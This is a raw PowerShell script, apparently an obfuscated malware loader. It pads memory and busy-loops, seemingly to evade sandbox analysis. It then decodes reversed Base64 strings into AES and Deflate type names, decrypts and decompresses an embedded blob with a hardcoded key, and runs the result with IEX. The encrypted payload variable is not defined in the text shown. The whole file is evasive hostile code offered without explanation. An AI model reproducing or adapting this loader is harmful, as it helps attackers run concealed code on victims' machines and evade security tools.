$wgxhirsswqsti = (Get-Process -Id $PID | Select-Object Name,@{Name="WorkingSet";Expression={($_.ws / 1024kb)}}).WorkingSet
if ($wgxhirsswqsti -lt 250) { $snpkopmxjtto = "a" * 300MB }
$iwpjxttkwqs = 0
$szummyuxks = 30000000
For ($iwpjxttkwqs=0; $iwpjxttkwqs -lt $szummyuxks;$iwpjxttkwqs++) { $iwpjxttkwqs++ }
$hjgwjstronpnsn = [System.Text.Encoding]::UTF8.GetBytes("pinzxghoyjnwnhoni")
$qqrtpxzmznvojzkqx = [System.Text.Encoding]::UTF8.GetBytes($qmpjqujywikhiqkz)
$msxjjqtuirs = $(for ($vmnsnzwkjr = 0; $vmnsnzwkjr -lt $qqrtpxzmznvojzkqx.length; ) {
    for ($xuguxgggiskgoyin = 0; $xuguxgggiskgoyin -lt $hjgwjstronpnsn.length; $xuguxgggiskgoyin++) {
        $qqrtpxzmznvojzkqx[$vmnsnzwkjr] -bxor $hjgwjstronpnsn[$xuguxgggiskgoyin]
        $vmnsnzwkjr++
        if ($vmnsnzwkjr -ge $qqrtpxzmznvojzkqx.Length) {
            $xuguxgggiskgoyin = $hjgwjstronpnsn.length
        }
    }
})
$msxjjqtuirs = [System.Text.Encoding]::UTF8.GetString($msxjjqtuirs)
$izxizupquh = "$msxjjqtuirs"
$iyusghqzzgkykxrsp = $izxizupquh.ToCharArray()
[array]::Reverse($iyusghqzzgkykxrsp)
$xkszjpyxukytsk = -join($iyusghqzzgkykxrsp)
$hogghiuhqt = [System.Convert]::FromBase64String("$xkszjpyxukytsk")
$vpwtrkkntgjinigqj = [System.Convert]::FromBase64String("IK/CUlQ5WhVMn3TOa7BEOiN9mHVAiaGMWuJk1YcUV+4=")
$sqkrpjtvnirr = "==gCkV2Zh5WYNNXZB5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3U"
$mnnvmmpjpv = $sqkrpjtvnirr.ToCharArray()
[array]::Reverse($mnnvmmpjpv)
$vznvmvmvxuh = -join($mnnvmmpjpv)
$rrqsvhpypmtr = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($vznvmvmvxuh))
$jmzrhtoryskup = New-Object "$rrqsvhpypmtr"
$mkqxrxquqs = "==wQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
$nphkhmjurkpqpvzy = $mkqxrxquqs.ToCharArray()
[array]::Reverse($nphkhmjurkpqpvzy)
$smrhxoqtkhtnqrqkm = -join($nphkhmjurkpqpvzy)
$grwponvtxqnos = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($smrhxoqtkhtnqrqkm))
$zmowrmtousxtkw = & ([scriptblock]::Create($grwponvtxqnos))
$jmzrhtoryskup.Mode = $zmowrmtousxtkw
$hztgwwyxnvnq = "==wcvJXZapjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
$gqzitpsxuhqsp = $hztgwwyxnvnq.ToCharArray()
[array]::Reverse($gqzitpsxuhqsp)
$zvkxsoiwqruwkpgq = -join($gqzitpsxuhqsp)
$kzwknuwssszk = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($zvkxsoiwqruwkpgq))
$gpjpgotwjohgkm = & ([scriptblock]::Create($kzwknuwssszk))
$jmzrhtoryskup.Padding = $gpjpgotwjohgkm
$jmzrhtoryskup.BlockSize = 128
$jmzrhtoryskup.KeySize = 192
$jmzrhtoryskup.Key = $vpwtrkkntgjinigqj
$jmzrhtoryskup.IV = $hogghiuhqt[0..15]
$rsmotgkwhqhsy = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLk1lbW9yeVN0cmVhbQ=="))
$qhnjpqmzxvqonij = New-Object $rsmotgkwhqhsy(,$jmzrhtoryskup.CreateDecryptor().TransformFinalBlock($hogghiuhqt,16,$hogghiuhqt.Length-16))
$vutqmximont = New-Object $rsmotgkwhqhsy
$gwhughmygskykw = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVjb21wcmVzcw=="))
$nvsrtiszjuvviopqk = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV0="))))
$yxxzrhswkouhtmx = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLkNvbXByZXNzaW9uLkRlZmxhdGVTdHJlYW0="))
$pkkzqkpgqpgkpn = New-Object $yxxzrhswkouhtmx $qhnjpqmzxvqonij, ($nvsrtiszjuvviopqk::$gwhughmygskykw)
$pkkzqkpgqpgkpn.CopyTo($vutqmximont)
$pkkzqkpgqpgkpn.Close()
$jmzrhtoryskup.Dispose()
$qhnjpqmzxvqonij.Close()
$qtznjzmuwsxuusygn = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5UZXh0LkVuY29kaW5nXQ=="))))
$mjguhrrxnq = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VVRGOA=="))
$tmizvwkigsn = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9BcnJheQ=="))
$qxzjpqipxwjm = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0U3RyaW5n"))
$vwyjxovyqp = $qtznjzmuwsxuusygn::$mjguhrrxnq.$qxzjpqipxwjm($vutqmximont.$tmizvwkigsn())
IEX($vwyjxovyqp)